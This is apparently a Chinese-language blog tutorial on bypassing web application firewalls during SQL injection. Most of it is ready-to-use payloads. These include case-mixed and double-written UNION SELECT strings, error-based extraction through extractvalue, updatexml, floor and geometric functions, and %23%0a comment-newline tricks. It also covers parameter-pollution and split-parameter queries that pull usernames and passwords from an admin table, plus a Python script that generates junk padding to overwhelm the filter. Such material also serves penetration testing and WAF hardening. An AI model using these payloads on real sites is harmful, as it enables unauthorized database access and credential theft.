---
title: 干货：SQL注入如何绕过WAF
tags: 
  - web安全
  - sql注入
  - WAF绕过
categories: web安全
keywords: 'sql注入,WAF,绕过'
description: 学习sql注入遇到waf的情况下如何进行绕过
cover: /images/sql.jpeg
date: 2020-05-12 19:05:13
---

在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。

 # 几种WAF的图片
![upload successful](/images/pasted-60.png)

![upload successful](/images/pasted-61.png)

![upload successful](/images/pasted-62.png)

这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。

首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。

Waf对于我来说，也就是规则，通俗点就是这个结构:
```
if(xxx){
	拦截！
}else{
	通过
}
```
也就是说，我们只需要让它同意我们的操作，即绕过了waf。

通常的waf一般可以有以下绕过方法：
# 1.	大小写绕过

（现在基本上遇不到了，不过也可以了解一下）

```
id=1 and UnIoN sElEcT 1,2,3
id=1 OrDeR By 1
```
# 2.	双写绕过

（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过）

```
id=1 ununionion selselectect 1,2,3 	删除一次--> union select 1,2,3
id=1 ororderder bbyy	1	删除一次--> order by 1
```
# 3.	编码绕过

（如果检测的是关键字，那么经过编码即可绕过）

URL全编码：http://web.chacuo.net/charseturlencode
![upload successful](/images/pasted-64.png)
十六进制：https://www.bejson.com/convert/ox2str/
![upload successful](/images/pasted-65.png)

>ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。

---
# 4.	基本符号替换
>用&&替换and	
>用||替换or	
>用/**/替换空格	
>URL栏中用+替换空格	

# 5.	报错注入替换函数绕过

（网站只检测一部分热门的函数，不检测一些冷门的函数）

全部以select user() 为例：
### 1.floor()
```
id = 1 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a)
```
### 2.extractvalue()
```
id = 1 and extractvalue(1, concat(0x7e,(select user())))
id = 1 and extractvalue(1,concat(char(126),database()))
```
### 3.updatexml()
```
id = 1 and updatexml(1,concat(0x7e,(select user())),1)
```
### 4.exp()
```
exp(~(select * from(select user()))a))
```
### 5.总体可以归为一处的函数
(1)	GeometryCollection()
```
id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))
```
(2)	polygon()
```
id =1 AND polygon((select * from(select * from(select user())a)b))
```
(3)	multipoint()
```
id = 1 AND multipoint((select * from(select * from(select user())a)b))
```
(4)	multilinestring()
```
id = 1 AND multilinestring((select * from(select * from(select user())a)b))
```
(5)	linestring()
```
id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
```
(6)	multipolygon()
```
id =1 AND multipolygon((select * from(select * from(select user())a)b))
```

# 6.	其他等价函数绕过
>hex()、bin() ==> ascii()	
>sleep() ==>benchmark()	
>concat_ws()==>group_concat()	
>mid()、substr() ==> substring()	
>@@user ==> user()	
>@@database ==> database()	

# 7.	内联注释配合注释绕过
```
Id=1/**//*! order*/+/*!by*/+1
```
# 8.	%0a换行跳出单行注释绕过
原理：数据库中对于#和--(空格)后面的东西都进行注释忽略处理
我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。
Payload：
```
id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201
id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3
```
# 9.	利用一些中间件的缺陷
1)	IIS+ASP
通过在关键词之间加%绕过。
```
id=1 and uni%on se%le%ct 1,2,3 from ad%min
```
2)	IIS的Unicode编码
IIS支持Unicode编码，可以通过编码关键词进行绕过：
http://tool.chinaz.com/tools/unicode.aspx
![upload successful](/images/pasted-68.png)

3)	HTTP参数污染
有的时候，浏览器对于这样的传参会出现以下情况：
```
id=1 and id=2 --> 出现在服务器中，id=1,2
```
那么我们可以这样绕：
```
id=1 and union select username & id= password form admin
--> id=1 and union select username, password form admin
```
对于这种参数重复传参的情况，不同环境有不同结果：

![upload successful](/images/pasted-69.png)

# 10.	更换传参方式绕过
在有些情况下，因为 $_REQUEST['id'] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。

 ![upload successful](/images/pasted-70.png)

# 11.	利用数据提取方式的缺陷进行绕过
PHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。

Example：
在PHP+Apache中	
x=1&y=2&z=3 在某些waf中会被提取为：	
x=1	
y=2	
z=3	
payload:	
```
id=1+union+/*&x=2*/+select/*&y=3*/+1,2,3+from+admin
```
waf检测方式为分别检测三个传参：	
id=1+union+/*	
x=2*/+select/*	
y=3*/1,2,3+from+admin	

数据库中，/**/中间的东西被过滤了，获得的传参为：	
```
id=1+union++select+1,2,3+from+admin
```
# 12.	脏数据绕过
在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:	
https://cloud.tencent.com/developer/article/1592593

```
#生成垃圾数据
#coding=utf-8
import random,string
from urllib import parse
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
    str_list = [random.choice(string.ascii_letters) for i in range(length)]
    random_str = ''.join(str_list)
    return random_str

def main():
    data={}
    for i in range(num_min,num_max):
        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
    print('&'+parse.urlencode(data)+'&')

main()
```